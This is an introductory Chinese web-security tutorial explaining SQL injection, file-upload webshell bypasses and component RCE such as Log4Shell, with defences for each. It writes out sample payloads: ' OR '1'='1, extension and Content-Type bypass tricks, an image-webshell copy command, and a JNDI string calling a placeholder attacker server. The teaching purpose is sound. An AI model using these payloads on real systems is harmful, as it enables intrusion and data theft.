03 Web 安全入门（网站最常见的漏洞是怎么发生的）

安全领域最常打交道的就是 Web 漏洞。这一章把最典型的三种讲透，让你不光记住名字，还真懂为什么。

一、先说人话：网站为什么会出漏洞

网站的"漏洞"，大多数不是玄学，而是程序员把"用户输入的东西"太当回事了——没检查就拼进代码/命令/数据库里去执行。

  • 正常情况：你在搜索框输入"香蕉"，程序就去找"香蕉"。
  • 漏洞情况：你在搜索框输入的不是一句话，而是一段"命令"，程序傻乎乎地把它当命令执行了。
  • 结果：不该给你看的数据被你看到了、甚至你能让网站听你的。

一句话：漏洞 = 用户输入被当成"代码/命令"执行了。

二、SQL 注入（最经典的一个）

人话讲清楚

  • 网站背后是数据库，存着用户名、密码、订单等。
  • 程序要查数据时，会拼一句"数据库能听懂的话"（叫 SQL）。比如：SELECT * FROM users WHERE 用户名 = '你输入的名字'。
  • 问题来了：如果程序直接把你的输入原样拼进去，那你在输入框里打一个 '（英文单引号）——这句话就语法被破坏了。
  • 你再输入 ' OR '1'='1，语句变成 WHERE 用户名 = '' OR '1'='1'——1=1 永远成立，于是数据库就把全部用户都返回给你了。

人话总结：攻击者把"坏的命令"混在你的正常输入里，网站没过滤就直接执行了 → 数据库里的数据被别人拖走。

常见的判断方法（上手时用）

  • 输入 ' 看网站是否报错 → 有反应=可能有注入点
  • 输入 ' OR '1'='1 看是否返回了更多数据 → 命中=注入点成立
  • 页面直接显示数据 = 回显（好测）；页面啥都不显示 = 盲注（只能靠判断真/假、延时来猜）

怎么防（这个必答）

① 参数化查询（预编译）——核心，让输入永远是"数据"而不是"代码"
② 数据库最小权限——应用账号别用 root
③ 过滤/转义危险字符——辅助

答安全题/做加固，"参数化查询"是 SQL 注入的标准答案，别的都是辅助。

三、文件上传漏洞

人话讲清楚

  • 网站有个"传图片/传附件"的功能。
  • 程序只想着"收文件"，没想着"这文件能不能被执行"。
  • 攻击者传的不是图片，而是一个网页木马（Webshell）——比如一个 .php 文件，内容能让他远程执行命令。
  • 如果网站把它当成图片存了，还允许访问执行，攻击者就等于在服务器上装了个遥控器。

为什么能绕过（最常见的几个"骗术"）

程序通常检查：后缀名、MIME 类型（文件类型标签）、文件头。攻击者绕法：

  • 换后缀大小写：.PHP、.PhP
  • 加个点或空格：shell.php. / shell.php
  • 伪装类型：把 Content-Type 改成本说 image/jpeg
  • 图片马：真图里藏木马（copy a.jpg + shell.php = x.jpg）
  • 利用解析漏洞：让服务器把 .jpg 也当 .php 执行

怎么防

白名单只允许真后缀 + 随机改名 + 上传目录禁止执行 + 文件头/内容校验

四、中间件 / 组件漏洞（RCE）

人话讲清楚

  • 网站不只是一行代码，它靠一堆"现成的组件"（Web 服务器、Java 框架、日志库）撑着。
  • 这些组件如果本身有漏洞，攻击者不用打你的业务逻辑，直接借组件的漏洞就能拿到服务器控制权——这种叫 RCE（远程执行代码）。
  • 最著名的例子：Log4j（一个记日志的组件）。攻击者在输入里写一行 ${jndi:ldap://攻击者服务器/evil}，Log4j 记日志时把这个当"命令"去下载执行了——服务器就中招了。

一句话记各组件（考到能对上号）

组件一句话特征
WebLogic常用端口 7001、有 /console 管理台，老版本反序列化能打
Shiro登录时带 rememberMe 这个 cookie，它反序列化能被攻击
FastjsonJSON 解析库，字段里写 @type 会触发反序列化
Log4j日志里出现 ${jndi: 就是中了 Log4Shell

怎么防

打补丁/升级版本 + 关掉不需要的端口/功能 + 限制外连

五、三个漏洞的统一规律（人话升华）

SQL 注入    =  输入被当成了 SQL 命令
文件上传    =  上传的东西被当成了网页脚本执行
中间件 RCE  =  输入被组件当成"要执行的东西"（如 jndi 下载）

共同点：信任了不该信任的输入 + 该防的没防

所以防御的核心思路也是一条：不要信任输入，该验证的验证，该限制的执行不了。

小结（人话速记）

  1. 漏洞 = 用户输入被当成了代码/命令/指令执行。
  2. SQL 注入靠"拼 SQL + 破坏语法 + OR 1=1"，防用参数化查询。
  3. 文件上传靠"网站没拦脚本"，防 = 白名单 + 改名 + 目录禁执行。
  4. 组件漏洞靠"组件本身有 bug"，防 = 升级 + 关端口。
  5. 统一口诀：不信任输入、最小权限、该禁就禁。

动手建议：装一个 DVWA（一个专门练手的靶场，网页就能搭）或本地靶机，亲手在"搜索框输入 ' OR 1=1 --"看能不能把全部数据查出来——你亲手跑一次，就真正懂了。
